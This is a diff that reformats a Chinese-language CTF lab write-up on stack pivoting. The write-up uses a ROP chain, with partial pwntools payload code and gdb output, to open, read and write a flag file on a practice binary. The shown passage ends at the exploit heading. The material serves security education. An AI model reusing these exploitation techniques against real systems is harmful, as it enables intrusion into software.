@@ -10,8 +10,8 @@ date: 2024-01-31
 <!-- more -->
 
 ## Background
-[Simple PWN - 0x09(stack pivoting)](https://hackmd.io/@SBK6401/rylybxgji)
-[Simple PWN - 0x10(seccomp/Lab - rop2win)](https://hackmd.io/@SBK6401/H1NX6Bloj)
+* [Simple PWN - 0x09(stack pivoting)](https://hackmd.io/@SBK6401/rylybxgji)
+* [Simple PWN - 0x10(seccomp/Lab - rop2win)](https://hackmd.io/@SBK6401/H1NX6Bloj)
 
 ## Source code
 ```cpp
@@ -61,7 +61,7 @@ int main(void)
     會這樣的原因是我們在ROPgadget中找不到`syscall ; ret`的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop
 3. Construct ROP
     首先，我們的流程是
-    ==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
+    `main_fn → bss_open → main_fn → bss_open → main_fn → bss_write`
     會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload
     1. 寫入的bss_addr和main_fn address
         ```python
@@ -85,7 +85,7 @@ int main(void)
         0x00007ffc884f3690│+0x0020: 0x00000000004c2700  →  <transmem_list+0> add BYTE PTR [rax], al      ← $rbp
         0x00007ffc884f3698│+0x0028: 0x0000000000401ce1  →  <main+12> lea rax, [rbp-0x20]
         ```
-        當main_fn執行完leave(`mov rsp , rbp ; pop rbp ;`)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700
+        當main_fn執行完leave(`mov rsp , rbp ; pop rbp ;`)的時候，rbp就會指到`0x4c2700`，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700
     2. 觀察main_fn的assembly
         ```bash
         gef➤  x/10i &main
@@ -100,9 +100,9 @@ int main(void)
            0x401cf2 <main+29>:  call   0x448270 <read>
            0x401cf7 <main+34>:  mov    eax,0x0
         ```
-        從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來
+        從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是`0x4c2700-0x20=0x4c26e0`，然後read到的內容就會放到這邊來
     3. 寫入bss_addr_open
-        我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下
+        我們的目標是達成`fd = open("/home/chal/flag.txt", 0);`，具體payload如下
         ```python
         file_addr = b'/home/chal/flag.txt'.ljust(0x20, b'\x00')
         ROP_open = flat(
@@ -120,7 +120,7 @@ int main(void)
         ```
         首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方
     4. 寫入bss_addr_read
-        我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下
+        我們要達成的目標是`read(fd, buf, 0x30)`，具體payload如下
         ```python
         ROP_read = flat(
             # Read the file
@@ -136,7 +136,7 @@ int main(void)
         r.sendline(file_addr + ROP_read)
         ```
     5. 寫入bss_addr_write
-        我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下
+        我們要達成的目標是`write(fd, buf, 0x30)`，具體payload如下
         ```python
         ROP_write = flat(
             # Write the file
@@ -152,7 +152,7 @@ int main(void)
         r.sendline(file_addr + ROP_write)
         ```
 
-:::danger
+
 執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行
 ```bash
 $ docker-compose up -d
@@ -162,7 +162,7 @@ $ docker exec -it {container name} /bin/bash
 > pip install pwntools -y
 > python3 exp.py
 ```
-:::
+
 
 ## Exploit - ROPchain + stack pivot
 ```python
